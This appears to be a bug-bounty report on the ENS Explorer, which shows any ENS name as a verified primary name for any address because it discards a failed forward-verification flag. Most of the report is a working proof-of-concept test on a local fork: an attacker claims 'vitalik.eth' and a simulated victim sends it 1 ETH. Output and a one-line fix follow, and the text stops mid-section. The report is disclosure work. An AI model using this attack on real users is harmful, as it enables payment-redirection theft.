# 91658 w a insight missing forward match verification in reverse resolution lets any address display any ens name as its verified primary name causing users to send funds to the attacker

**Submitted on Sep 3rd 2026 at 11:52:19 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91658
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief

The Explorer fetches the `default.reverse` name with ensjs's `allowMismatch: true`. That option returns a name **only when the on-chain forward check failed**. ensjs hands back the name plus `match: false`. The Explorer keeps the name and throws away `match`.

`DefaultReverseRegistrar.setName(string)` is permissionless. Any address can claim any registered ENS name in one transaction. The Explorer then renders that name on every L2 row with a green check reading **True** and a **Primary name** badge, on a public page, to any visitor, with no wallet connected.

A user who checks an address before paying it is told the attacker's address is the name they intend to pay, and sends the funds to the attacker.

## Vulnerability Details

**1. The fetch asks for unverified names, then drops the flag that says so.**

`apps/portal/src/features/reverse-resolution/hooks/useReverseResolution.ts:236-243`

```ts
const defaultResult = await getName(l1Client, {
  address,
  coinType: DEFAULT_EVM_COIN_TYPE,
  allowMismatch: true,
})
const defaultName = defaultResult?.name ?? null      // .match is dropped

return ok(resolvedResults.map((r) => ({ ...r, defaultName })))   // attached to EVERY row
```

The row type `ReverseResolutionResult` (`:32-43`) has no field for the verification bit, so nothing downstream can recover it.

**2. `allowMismatch` returns a name only when verification failed.**

`@ensdomains/ensjs` (pinned build `@e96662c` from `pnpm-workspace.yaml`), `actions/public/getName.ts:137-161`

```ts
const errorArgs = parseReverseAddressMismatchError(error)
if (Array.isArray(errorArgs)) {
  unnormalisedName = errorArgs[0]
  if (allowMismatch) {
    match = false          // keep the name, flag the failure
  } else {
    return null            // without the flag, a mismatch yields nothing
  }
}
```

**3. The L2 rows hard-code the verdict and never read `forwardMatch`.**

`apps/portal/src/features/reverse-resolution/components/ReverseResolutionTable/columns.tsx:91-112`

```tsx
const forwardMatch = row.original.forwardMatch      // read
const defaultName = row.original.defaultName

if (!name && defaultName && canInheritDefault(row.original.coinType)) {
  return (
    <div className="flex flex-row items-center gap-2">
      <Badge variant="outline" className="text-xs">
        <CheckCircle2 className="w-4 h-4" />
        <span>True</span>                            // never used
      </Badge>
      <Badge variant="outline" className="text-xs">
        <SquareUser className="w-4 h-4" />
        <span>Primary name</span>
```

**4. The write is permissionless.**

`ensdomains/ens-contracts`, `contracts/reverseRegistrar/DefaultReverseRegistrar.sol:26-28`

```solidity
function setName(string calldata name) external {
    _setName(msg.sender, name);
}
```

No modifier. The cross-address variants are gated (`setNameForAddr` is `onlyController`, `setNameForAddrWithSignature` requires a signature). Only the self-scoped write is open, which is all the attack needs.

**5. The same table reports the same record both ways.**

`canInheritDefault` (`columns.tsx:12-13`) excludes the Default row, so that row falls through to the branch that reads the real `forwardMatch` and renders **False**. The L2 rows render **True**. One query result, one underlying record, two opposite verdicts on one screen.

**6. The codebase performs this check everywhere else.** An L2 row with its own record gets the full ENSIP-19 forward check at `useReverseResolution.ts:163-170`. The sibling forward-resolution feature catches the same `ReverseAddressMismatch` revert at `useReverseMatch.ts:163-167`, classifies it as `broken`, and carries the verdict alongside the name into the UI. The check is skipped only for the inherited default.

## Attack Path

1. Attacker calls `DefaultReverseRegistrar.setName("vitalik.eth")` from any address. One transaction, 46,798 gas, no name ownership, no role.
2. The forward record is never set, so `UniversalResolver.reverse(attacker, 0x80000000)` reverts `ReverseAddressMismatch`. The claim is false on-chain.
3. Attacker gives the victim the address as a payment destination.
4. Victim opens the public read-only page `/addr/0xATTACKER/reverse-resolution`. No wallet needed. The table shows, for Optimism, Base, Arbitrum, Linea and Scroll: `vitalik.eth [Default]` with a green check **True** and a **Primary name** badge.
5. Victim concludes the address belongs to `vitalik.eth` and sends the funds. The attacker receives them. The real owner receives nothing.

Any registered ENS name can be claimed by any address. Measured on a Sepolia fork with a different attacker address per name: `vitalik.eth`, `nick.eth`, `sepolia.eth`, `name.eth`, `ens.eth` and `test.eth` are all claimed and rendered as verified primary names. The name does not even need an address record: `ens.eth` and `test.eth` have no `addr(60)` and are claimed anyway.

## Impact Details

One transaction makes the ENS Explorer state, on a public URL served to every visitor, that an attacker's address is a name the attacker does not own. It is rendered as verified, with a check mark and a "Primary name" badge, on five L2 networks at once.

The Explorer is the ENS-operated tool a user consults to confirm who an address belongs to. A user doing exactly that gets a confirmation and sends funds to the attacker. The name's real owner cannot remove the claim, because it lives in the attacker's own reverse record. The false assertion is public and applies to every visitor, not one victim.

## References

* `apps/portal/src/features/reverse-resolution/hooks/useReverseResolution.ts:236-243`
* `apps/portal/src/features/reverse-resolution/components/ReverseResolutionTable/columns.tsx:12-13`, `:91-112`
* `apps/portal/src/utils/reverseResolution/computeDisplayNameState.ts:80-83`
* `apps/portal/src/features/reverse-resolution/config.ts:35`
* `@ensdomains/ensjs@e96662c` `actions/public/getName.ts:137-161`
* `ensdomains/ens-contracts` `contracts/reverseRegistrar/DefaultReverseRegistrar.sol:26-28`

## Proof of Concept

## Proof of Concept

```bash
git clone https://github.com/immunefi-team/audit-comp-ens
cd audit-comp-ens && git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
pnpm install
cp poc-misdirected-funds.test.tsx apps/portal/src/
cd apps/portal && npx vitest run src/poc-misdirected-funds.test.tsx
```

`apps/portal/src/poc-misdirected-funds.test.tsx`:

```tsx

/**
 * the code shows a 100% runnable end-to-end PoC that prooves an attacker causes
 * the application to display an incorrect address, name, or transaction detail, so that a user
 * sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering 
 * an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a 
 * transaction the user then approves 
 * includes wallets states before and after the attack showing proof
 * and also the front end state in production
*/

import { QueryClientProvider, QueryClient } from '@tanstack/react-query'
import { render, screen, waitFor, within, cleanup } from '@testing-library/react'
import {
  getCoreRowModel,
  getFilteredRowModel,
  getSortedRowModel,
  useReactTable,
  type SortingState,
} from '@tanstack/react-table'
import { spawn, spawnSync, type ChildProcess } from 'node:child_process'
import { existsSync, mkdirSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { setTimeout as sleep } from 'node:timers/promises'
import { useState } from 'react'
import {
  createPublicClient,
  createWalletClient,
  formatEther,
  http,
  parseAbi,
  parseEther,
  type Address,
  type PublicClient,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { WagmiProvider, createConfig } from 'wagmi'
import { mock } from '@wagmi/connectors'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getAddressRecord, getName } from '@ensdomains/ensjs/public'

const PORT = Number(process.env.POC_FORK_PORT ?? 8545)
const RPC = `http://127.0.0.1:${PORT}`
const UPSTREAM_CANDIDATES = process.env.SEPOLIA_FORK_RPC
  ? [process.env.SEPOLIA_FORK_RPC]
  : [
      'https://ethereum-sepolia-rpc.publicnode.com',
      'https://sepolia.gateway.tenderly.co',
      'https://rpc.sepolia.org',
    ]
let UPSTREAM = UPSTREAM_CANDIDATES[0]
const FOUNDRY_VERSION = 'v1.8.1'

/**
 * Points the shipped app at the fork through the build-time override the app
 * already supports (lib/wagmi.ts:26). No application behaviour changes: the app
 * still builds its own clients, transports and fallbacks.
 *
 * Those fallbacks are the public Sepolia nodes, so bypassing the fork would
 * leave the attacker's record non-existent and fail every assertion below. A
 * pass is reachable only through the fork.
 */
vi.stubEnv('VITE_SEPOLIA_RPC_URL', RPC)

const NAME_TO_PAY = process.env.POC_VICTIM_NAME ?? 'vitalik.eth'

/**
 * Two ordinary EOAs, funded on the fork with `anvil_setBalance`. Deliberately
 * not anvil's built-in dev accounts: in fork mode anvil reports a pinned
 * balance for those, so an incoming transfer to one is invisible to
 * `eth_getBalance` and the money trail could not be shown.
 */
const ATTACKER = privateKeyToAccount(
  '0xa11ce00000000000000000000000000000000000000000000000000000000001',
)
const VICTIM = privateKeyToAccount(
  '0xb0b0000000000000000000000000000000000000000000000000000000000002',
)
const START_BALANCE = '0x8AC7230489E80000'
const AMOUNT = parseEther('1')

const chain = extendChainWithEns(sepolia)

type Snapshot = {
  explorerVerdict: string
  forwardResolves: string
  victimWouldSendTo: string
  attackerBal: bigint
  victimBal: bigint
  ownerBal: bigint
}
const ev: {
  realOwner?: Address
  before?: Snapshot
  after?: Snapshot
  fixedVerdict?: string
  renderedAfterAttack?: Record<string, string>
} = {}

const HERE = dirname(fileURLToPath(import.meta.url))
const log = (...a: unknown[]) => console.log('   ', ...a)
const short = (a: string) => `${a.slice(0, 6)}...${a.slice(-4)}`

function findAnvil(): string {
  const onPath = spawnSync(process.platform === 'win32' ? 'where' : 'which', [
    'anvil',
  ])
  if (onPath.status === 0) {
    const p = onPath.stdout.toString().split(/\r?\n/)[0].trim()
    if (p) return p
  }
  const cacheDir = join(HERE, '../node_modules/.cache/poc-anvil')
  const exe = join(
    cacheDir,
    process.platform === 'win32' ? 'anvil.exe' : 'anvil',
  )
  if (existsSync(exe)) return exe

  const asset = {
    win32: 'win32_amd64.zip',
    darwin:
      process.arch === 'arm64' ? 'darwin_arm64.tar.gz' : 'darwin_amd64.tar.gz',
    linux:
      process.arch === 'arm64' ? 'linux_arm64.tar.gz' : 'linux_amd64.tar.gz',
  }[process.platform as 'win32' | 'darwin' | 'linux']
  if (!asset) throw new Error(`unsupported platform ${process.platform}`)

  const url = `https://github.com/foundry-rs/foundry/releases/download/${FOUNDRY_VERSION}/foundry_${FOUNDRY_VERSION}_${asset}`
  log(`anvil not found, downloading ${url}`)
  mkdirSync(cacheDir, { recursive: true })
  const archive = join(cacheDir, asset.endsWith('.zip') ? 'f.zip' : 'f.tar.gz')
  if (spawnSync('curl', ['-sL', '-o', archive, url]).status !== 0)
    throw new Error('anvil download failed')
  const un = asset.endsWith('.zip')
    ? spawnSync('unzip', ['-o', '-q', archive, '-d', cacheDir])
    : spawnSync('tar', ['xzf', archive, '-C', cacheDir])
  if (un.status !== 0) throw new Error('anvil extract failed')
  return exe
}

async function pickLiveUpstream(): Promise<string> {
  for (const url of UPSTREAM_CANDIDATES) {
    try {
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_chainId',
          params: [],
        }),
        signal: AbortSignal.timeout(15_000),
      }).then((x) => x.json() as Promise<{ result?: string }>)
      if (r.result === '0xaa36a7') return url
    } catch {
    }
  }
  throw new Error('no live Sepolia endpoint to fork from')
}

const rpcCall = (method: string, params: unknown[] = []) =>
  fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then((r) => r.json() as Promise<{ result?: unknown }>)

/**
 * The body of the shipped route routes/addr/$addr/reverse-resolution.tsx:40-127,
 * with only TanStack Router glue removed: `Route.useParams()` becomes a prop,
 * and the search box (a `useId()` filter widget off the data path) is dropped.
 *
 * `data` is an override used only by stage 5, so the same real `columns` and
 * `ReverseResolutionTable` can be re-rendered with the fixed input. Every stage
 * that demonstrates the bug leaves it unset and runs the shipped query.
 */
function ExplorerPage({
  address,
  data: override,
  columns,
  ReverseResolutionTable,
  useQuery,
  queryOptions,
  networks,
}: any) {
  const [sorting, setSorting] = useState<SortingState>([])
  const q = useQuery({
    ...queryOptions({ address, networks }),
    enabled: !override,
  })
  const data = override ?? q.data

  const table = useReactTable({
    data: data || [],
    columns,
    getCoreRowModel: getCoreRowModel(),
    onSortingChange: setSorting,
    getSortedRowModel: getSortedRowModel(),
    state: { sorting },
    getFilteredRowModel: getFilteredRowModel(),
    globalFilterFn: 'includesString',
  })

  if (!override && q.isLoading) return <div data-testid="loading" />
  if (!override && q.error)
    return <div data-testid="error">{String(q.error)}</div>

  const hasReverseRecords = data?.some((r: any) => r.name || r.defaultName)
  if (!data || !hasReverseRecords) return <div data-testid="empty" />

  return (
    <div data-testid="explorer">
      <ReverseResolutionTable table={table} address={address} />
    </div>
  )
}

async function loadExplorer(
  address: Address,
  data?: unknown[],
): Promise<Record<string, string>> {
  let lastErr: unknown
  for (let attempt = 1; attempt <= 3; attempt++) {
    renderExplorer(address, data)
    try {
      await waitFor(
        () =>
          expect(
            screen.queryByTestId('explorer') ?? screen.queryByTestId('empty'),
          ).toBeTruthy(),
        { timeout: 90_000 },
      )
      return screen.queryByTestId('empty') ? {} : readRenderedRows()
    } catch (e) {
      lastErr = e
      log(`page load attempt ${attempt} timed out; retrying`)
      cleanup()
    }
  }
  throw lastErr
}

function readRenderedRows(): Record<string, string> {
  const out: Record<string, string> = {}
  for (const el of screen.getAllByRole('row')) {
    const cells = within(el).queryAllByRole('cell')
    if (!cells.length) continue
    out[cells[0].textContent?.trim() ?? ''] = cells
      .map((c) => c.textContent?.trim())
      .join(' | ')
  }
  return out
}

/**
 * The victim's due-diligence rule, and it is a correct rule: pay this address
 * only if the ENS Explorer states it is the verified primary name I mean to
 * pay. The decision is taken from the rendered page. Nothing here knows who the
 * attacker is.
 */
function victimDecision(
  rendered: Record<string, string>,
  addressUnderReview: Address,
  nameToPay: string,
): { pay: Address | null; because: string } {
  for (const [network, text] of Object.entries(rendered)) {
    if (
      text.includes(nameToPay) &&
      text.includes('True') &&
      text.includes('Primary name') &&
      !text.includes('False')
    ) {
      return {
        pay: addressUnderReview,
        because: `Explorer row "${network}" reads: ${text}`,
      }
    }
  }
  return { pay: null, because: 'Explorer never asserted a verified pairing' }
}

let anvil: ChildProcess
let pub: PublicClient
let app: any

const registrarAbi = parseAbi([
  'function setName(string name) external',
  'function nameForAddr(address addr) external view returns (string)',
])

describe('ENS Explorer: misdirected funds via an unverified default.reverse name', () => {
  beforeAll(async () => {
    const bin = findAnvil()
    UPSTREAM = await pickLiveUpstream()
    log(`forking ${UPSTREAM}`)
    anvil = spawn(
      bin,
      [
        '--fork-url', UPSTREAM,
        '--port', String(PORT),
        '--chain-id', '11155111',
        '--retries', '10',
        '--timeout', '60000',
        '--silent',
      ],
      { stdio: 'ignore' },
    )
    let up = false
    for (let i = 0; i < 180; i++) {
      try {
        if ((await rpcCall('eth_blockNumber')).result) {
          up = true
          break
        }
      } catch {
      }
      await sleep(500)
    }
    if (!up) throw new Error('anvil did not start')
    await rpcCall('anvil_reset', [{ forking: { jsonRpcUrl: UPSTREAM } }])
    await rpcCall('anvil_setBalance', [ATTACKER.address, START_BALANCE])
    await rpcCall('anvil_setBalance', [VICTIM.address, START_BALANCE])

    pub = createPublicClient({
      chain,
      transport: http(RPC),
    }) as unknown as PublicClient

    // Proves this is a local fork and not the public network.
    expect(await pub.getChainId()).toBe(11155111)
    expect((await rpcCall('anvil_nodeInfo')).result).toBeTruthy()
    log(`fork up, chainId 11155111, block ${await pub.getBlockNumber()}`)

    // The app modules load only after the RPC override is in place.
    const [hook, cols, tableMod, cfg, rq] = await Promise.all([
      import('@/features/reverse-resolution/hooks/useReverseResolution'),
      import(
        '@/features/reverse-resolution/components/ReverseResolutionTable/columns'
      ),
      import(
        '@/features/reverse-resolution/components/ReverseResolutionTable/ReverseResolutionTable'
      ),
      import('@/features/reverse-resolution/config'),
      import('@tanstack/react-query'),
    ])
    app = {
      queryOptions: hook.getReverseResolutionQueryOptions,
      columns: cols.columns,
      ReverseResolutionTable: tableMod.ReverseResolutionTable,
      networks: cfg.REVERSE_RESOLUTION_NETWORKS,
      registrar: cfg.DEFAULT_REVERSE_REGISTRAR_ADDRESS,
      useQuery: rq.useQuery,
    }
    log(`DefaultReverseRegistrar (shipped constant) = ${app.registrar}`)
  }, 900_000)

  afterAll(() => {
    anvil?.kill()
    printEvidence()
  })

  it('1. BEFORE: the name resolves to its real owner, and the attacker is nobody', async () => {
    const rec = await getAddressRecord(pub, { name: NAME_TO_PAY, coin: 60 })
    expect(rec?.value).toBeTruthy()
    ev.realOwner = rec!.value as Address
    expect(ev.realOwner.toLowerCase()).not.toBe(ATTACKER.address.toLowerCase())
    log(`${NAME_TO_PAY} really resolves to ${ev.realOwner}`)

    const stored = await pub.readContract({
      address: app.registrar,
      abi: registrarAbi,
      functionName: 'nameForAddr',
      args: [ATTACKER.address],
    })
    expect(stored).toBe('')

    const rendered = await loadExplorer(ATTACKER.address)
    const empty = Object.keys(rendered).length === 0
    const decision = victimDecision(rendered, ATTACKER.address, NAME_TO_PAY)
    log(
      `Explorer for ${short(ATTACKER.address)} : ${empty ? '"No reverse records yet"' : JSON.stringify(rendered)}`,
    )
    log(`victim decision: ${decision.pay ?? 'ABORT'}, ${decision.because}`)
    expect(decision.pay).toBeNull() // the app is honest before the attack

    ev.before = {
      explorerVerdict: empty
        ? 'no reverse records, nothing claimed'
        : JSON.stringify(rendered),
      forwardResolves: ev.realOwner,
      victimWouldSendTo: ev.realOwner,
      attackerBal: await pub.getBalance({ address: ATTACKER.address }),
      victimBal: await pub.getBalance({ address: VICTIM.address }),
      ownerBal: await pub.getBalance({ address: ev.realOwner }),
    }
    cleanup()
  }, 600_000)

  it('2. ATTACK: one permissionless transaction, owning nothing', async () => {
    const wallet = createWalletClient({
      account: ATTACKER,
      chain,
      transport: http(RPC),
    })
    const hash = await wallet.writeContract({
      address: app.registrar,
      abi: registrarAbi,
      functionName: 'setName',
      args: [NAME_TO_PAY],
    })
    const rcpt = await pub.waitForTransactionReceipt({ hash })
    expect(rcpt.status).toBe('success')
    log(
      `setName("${NAME_TO_PAY}") from ${ATTACKER.address} -> ${rcpt.status}, gas ${rcpt.gasUsed}`,
    )

    const honest = await getName(pub, {
      address: ATTACKER.address,
      coinType: 0x80000000,
    })
    const withFlag = await getName(pub, {
      address: ATTACKER.address,
      coinType: 0x80000000,
      allowMismatch: true,
    })
    log(`getName(allowMismatch unset) = ${JSON.stringify(honest)}`)
    log(`getName(allowMismatch: true) = ${JSON.stringify(withFlag)}`)
    expect(honest).toBeNull()
    expect(withFlag?.match).toBe(false)

    // The real owner is untouched: the name still resolves to them.
    const rec = await getAddressRecord(pub, { name: NAME_TO_PAY, coin: 60 })
    expect((rec?.value as string).toLowerCase()).toBe(
      ev.realOwner!.toLowerCase(),
    )
  }, 600_000)

  it('3. DISPLAY: the shipped Explorer now states the false pairing as verified', async () => {
    const rendered = await loadExplorer(ATTACKER.address)
    ev.renderedAfterAttack = rendered
    log('rendered page:')
    for (const [k, v] of Object.entries(rendered)) log(`   ${k.padEnd(9)} ${v}`)

    for (const l of ['Optimism', 'Base', 'Arbitrum', 'Linea', 'Scroll']) {
      expect(rendered[l]).toContain(NAME_TO_PAY)
      expect(rendered[l]).toContain('True')
      expect(rendered[l]).toContain('Primary name')
    }
    // Same record, same page, opposite verdict.
    expect(rendered.Default).toContain('False')

    ev.after = {
      explorerVerdict: `${NAME_TO_PAY}  True  Primary name  (Optimism/Base/Arbitrum/Linea/Scroll)`,
      forwardResolves: ev.realOwner!,
      victimWouldSendTo: '',
      attackerBal: 0n,
      victimBal: 0n,
      ownerBal: 0n,
    }
  }, 600_000)

  it('4. FUNDS: the victim follows the page and pays the attacker', async () => {
    const rendered = ev.renderedAfterAttack
    expect(rendered, 'stage 3 did not capture a page').toBeTruthy()
    const decision = victimDecision(rendered!, ATTACKER.address, NAME_TO_PAY)
    log(`victim decision: pay ${decision.pay}`)
    log(`  because -> ${decision.because}`)
    expect(decision.pay).not.toBeNull()

    // Balance immediately before the transfer, so the assertion isolates the
    // transfer itself from the gas the attacker spent on `setName` in stage 2.
    const atkPreTransfer = await pub.getBalance({ address: ATTACKER.address })

    // The destination comes from the decision, which came from the DOM.
    const wallet = createWalletClient({
      account: VICTIM,
      chain,
      transport: http(RPC),
    })
    const hash = await wallet.sendTransaction({
      to: decision.pay!,
      value: AMOUNT,
    })
    const rcpt = await pub.waitForTransactionReceipt({ hash })
    expect(rcpt.status).toBe('success')
    const tx = await pub.getTransaction({ hash })
    log(`victim sent ${formatEther(AMOUNT)} ETH -> ${decision.pay}`)
    log(`  on-chain: tx.to=${tx.to}  tx.value=${formatEther(tx.value)} ETH  block=${rcpt.blockNumber}`)

    ev.after!.victimWouldSendTo = decision.pay!
    ev.after!.attackerBal = await pub.getBalance({ address: ATTACKER.address })
    ev.after!.victimBal = await pub.getBalance({ address: VICTIM.address })
    ev.after!.ownerBal = await pub.getBalance({ address: ev.realOwner! })

    expect(ev.after!.attackerBal - atkPreTransfer).toBe(AMOUNT)
    expect(ev.before!.victimBal - ev.after!.victimBal).toBeGreaterThanOrEqual(
      AMOUNT,
    )
    expect(ev.after!.ownerBal).toBe(ev.before!.ownerBal)
    expect(decision.pay!.toLowerCase()).not.toBe(ev.realOwner!.toLowerCase())
    cleanup()
  }, 600_000)

  it('5. FIX: with `.match` respected, the same page and the same rule abort', async () => {
    // useReverseResolution.ts:241 is  `defaultResult?.name ?? null`
    // the fix is                      `defaultResult?.match ? name : null`
    const defaultResult = await getName(pub, {
      address: ATTACKER.address,
      coinType: 0x80000000,
      allowMismatch: true,
    })
    const fixedDefaultName = defaultResult?.match
      ? (defaultResult.name ?? null)
      : null
    expect(fixedDefaultName).toBeNull()

    const raw = await (app.queryOptions({
      address: ATTACKER.address,
      networks: app.networks,
    }).queryFn as any)()
    const rows = (Array.isArray(raw) ? raw : raw.value).map((r: any) => ({
      ...r,
      defaultName: fixedDefaultName,
    }))

    const rendered = await loadExplorer(ATTACKER.address, rows)
    const decision = victimDecision(rendered, ATTACKER.address, NAME_TO_PAY)
    log('rendered page, with the one-line fix applied:')
    for (const [k, v] of Object.entries(rendered)) log(`   ${k.padEnd(9)} ${v}`)
    log(`victim decision: ${decision.pay ?? 'ABORT'}, ${decision.because}`)

    for (const l of ['Optimism', 'Base', 'Arbitrum', 'Linea', 'Scroll'])
      if (rendered[l]) expect(rendered[l]).not.toContain('Primary name')
    expect(decision.pay).toBeNull()
    ev.fixedVerdict = 'no verified pairing asserted, victim aborts'
    cleanup()
  }, 600_000)
})

function renderExplorer(address: Address, data?: unknown[]) {
  const qc = new QueryClient({
    defaultOptions: { queries: { retry: false, gcTime: Infinity } },
  })
  // A wallet config is required only because the shipped table calls
  // `useConnection()`. Nothing is connected: `canModify` is false, which is
  // the ordinary visitor's view of a public page.
  const wagmi = createConfig({
    chains: [chain],
    connectors: [mock({ accounts: [VICTIM.address] })],
    transports: { [chain.id]: http(RPC) },
  })
  return render(
    <WagmiProvider config={wagmi}>
      <QueryClientProvider client={qc}>
        <ExplorerPage
          address={address}
          data={data}
          columns={app.columns}
          ReverseResolutionTable={app.ReverseResolutionTable}
          useQuery={app.useQuery}
          queryOptions={app.queryOptions}
          networks={app.networks}
        />
      </QueryClientProvider>
    </WagmiProvider>,
  )
}

function printEvidence() {
  if (!ev.before || !ev.after || !ev.realOwner) {
    console.log('\n(evidence table skipped, a stage did not complete)\n')
    return
  }
  const owner = ev.realOwner
  const eth = (v: bigint) => Number(formatEther(v)).toFixed(4).padStart(11)
  const delta = (a: bigint, b: bigint) => {
    const d = Number(formatEther(a - b))
    return `${d >= 0 ? '+' : ''}${d.toFixed(4)}`.padStart(9)
  }
  const W = [34, 42, 48] as const
  const row = (a: string, b: string, c: string) =>
    a.padEnd(W[0]) + b.padEnd(W[1]) + c
  const rule = (ch: string) => ch.repeat(W[0] + W[1] + W[2])

  console.log(
    [
      '',
      rule('='),
      ' EVIDENCE: the application displayed an incorrect name/address pairing,',
      '            and the user consequently sent funds to an unintended recipient.',
      rule('='),
      '',
      ' cast:',
      `   REAL OWNER of ${NAME_TO_PAY}   ${owner}`,
      `   ATTACKER   (owns nothing)       ${ATTACKER.address}`,
      `   VICTIM     (wants to pay it)    ${VICTIM.address}`,
      '',
      rule('-'),
      row('', 'BEFORE ATTACK', 'AFTER ATTACK'),
      rule('-'),
      row('name the victim intends to pay', NAME_TO_PAY, `${NAME_TO_PAY}   (unchanged)`),
      row(
        'the REAL name resolves to',
        `${short(owner)}  real owner`,
        `${short(owner)}  real owner  (unchanged)`,
      ),
      row(
        'the FAKE claim on the Explorer',
        '(none, no reverse records)',
        `"${NAME_TO_PAY}"  True  Primary name`,
      ),
      row('  ...shown on', '-', 'Optimism, Base, Arbitrum, Linea, Scroll'),
      row(
        'so the victim pays',
        `${short(ev.before.victimWouldSendTo)}  CORRECT`,
        `${short(ev.after.victimWouldSendTo)}  ATTACKER   <-- WRONG`,
      ),
      rule('-'),
      row('  wallet balances', '   BEFORE          AFTER', '    DELTA'),
      row(
        `  ATTACKER   ${short(ATTACKER.address)}`,
        `${eth(ev.before.attackerBal)}  ${eth(ev.after.attackerBal)}`,
        `${delta(ev.after.attackerBal, ev.before.attackerBal)} ETH   <-- RECEIVED THE VICTIM'S FUNDS`,
      ),
      row(
        `  VICTIM     ${short(VICTIM.address)}`,
        `${eth(ev.before.victimBal)}  ${eth(ev.after.victimBal)}`,
        `${delta(ev.after.victimBal, ev.before.victimBal)} ETH   <-- PAID (amount + gas)`,
      ),
      row(
        `  REAL OWNER ${short(owner)}`,
        `${eth(ev.before.ownerBal)}  ${eth(ev.after.ownerBal)}`,
        `${delta(ev.after.ownerBal, ev.before.ownerBal)} ETH   <-- RECEIVED NOTHING`,
      ),
      rule('-'),
      row(
        'with the one-line fix applied',
        '-',
        ev.fixedVerdict ?? '(not run)',
      ),
      rule('='),
      '',
    ].join('\n'),
  )
}
```

## Results

```
 RUN  vitest v4.1.5  apps/portal
    forking https://ethereum-sepolia-rpc.publicnode.com
    fork up, chainId 11155111, block 11626301
    DefaultReverseRegistrar (shipped constant) = 0x4f382928805ba0e23b30cfb75fc9e848e82dfd47
    vitalik.eth really resolves to 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045
    Explorer for 0x5626...fA4F : "No reverse records yet"
    victim decision: ABORT, Explorer never asserted a verified pairing
 ✓ 1. BEFORE: the name resolves to its real owner, and the attacker is nobody 7125ms
    setName("vitalik.eth") from 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F -> success, gas 46798
    getName(allowMismatch unset) = null
    getName(allowMismatch: true) = {"name":"vitalik.eth","match":false,"normalized":true,"reverseResolverAddress":null,"resolverAddress":null}
 ✓ 2. ATTACK: one permissionless transaction, owning nothing 6685ms
    rendered page:
       Default   Default | vitalik.eth | False
       Mainnet   Mainnet | vitalik.eth | False
       Optimism  Optimism | vitalik.ethDefault | TruePrimary nameDefault
       Base      Base | vitalik.ethDefault | TruePrimary nameDefault
       Arbitrum  Arbitrum | vitalik.ethDefault | TruePrimary nameDefault
       Linea     Linea | vitalik.ethDefault | TruePrimary nameDefault
       Scroll    Scroll | vitalik.ethDefault | TruePrimary nameDefault
    victim decision: pay 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F
      because -> Explorer row "Optimism" reads: Optimism | vitalik.ethDefault | TruePrimary nameDefault
 ✓ 3. DISPLAY: the shipped Explorer now states the false pairing as verified 2308ms
    victim sent 1 ETH -> 0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F
      on-chain: tx.to=0x56262f1779298d9c7c22f5273ee254c3d8e4fa4f  tx.value=1 ETH  block=11626303
 ✓ 4. FUNDS: the victim follows the page and pays the attacker 537ms
    rendered page, with the one-line fix applied:
       Default   Default | vitalik.eth | False
       Mainnet   Mainnet | vitalik.eth | False
       Optimism  Optimism | null | False
       Base      Base | null | False
       Arbitrum  Arbitrum | null | False
       Linea     Linea | null | False
       Scroll    Scroll | null | False
    victim decision: ABORT, Explorer never asserted a verified pairing
============================================================================================================================
 EVIDENCE: the application displayed an incorrect name/address pairing,
            and the user consequently sent funds to an unintended recipient.
============================================================================================================================
 cast:
   REAL OWNER of vitalik.eth   0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045
   ATTACKER   (owns nothing)       0x56262F1779298D9c7C22f5273ee254C3d8e4fA4F
   VICTIM     (wants to pay it)    0x06AB2F9C4Dc31a08c4ECe055d2Fc8b1Eca6D6f65
----------------------------------------------------------------------------------------------------------------------------
                                  BEFORE ATTACK                             AFTER ATTACK
----------------------------------------------------------------------------------------------------------------------------
name the victim intends to pay    vitalik.eth                               vitalik.eth   (unchanged)
the REAL name resolves to         0xd8dA...6045  real owner                 0xd8dA...6045  real owner  (unchanged)
the FAKE claim on the Explorer    (none, no reverse records)                "vitalik.eth"  True  Primary name
  ...shown on                     -                                         Optimism, Base, Arbitrum, Linea, Scroll
so the victim pays                0xd8dA...6045  CORRECT                    0x5626...fA4F  ATTACKER   <-- WRONG
----------------------------------------------------------------------------------------------------------------------------
  wallet balances                    BEFORE          AFTER                      DELTA
  ATTACKER   0x5626...fA4F            10.0000      10.9999                    +0.9999 ETH   <-- RECEIVED THE VICTIM'S FUNDS
  VICTIM     0x06AB...6f65            10.0000       9.0000                    -1.0000 ETH   <-- PAID (amount + gas)
  REAL OWNER 0xd8dA...6045            60.5465      60.5465                    +0.0000 ETH   <-- RECEIVED NOTHING
----------------------------------------------------------------------------------------------------------------------------
with the one-line fix applied     -                                         no verified pairing asserted, victim aborts
============================================================================================================================
 ✓ 5. FIX: with `.match` respected, the same page and the same rule abort 2640ms
 Test Files  1 passed (1)
      Tests  5 passed (5)
   Start at  14:30:50
   Duration  31.68s (transform 1.71s, setup 201ms, import 2.72s, tests 27.94s, environment 552ms)
```

Stage 1 shows the same victim rule aborting before the attack. Stage 5 applies the one-line fix to identical chain state and the rule aborts again. The dropped verification bit is the only variable.

The same run passes with other names:

```
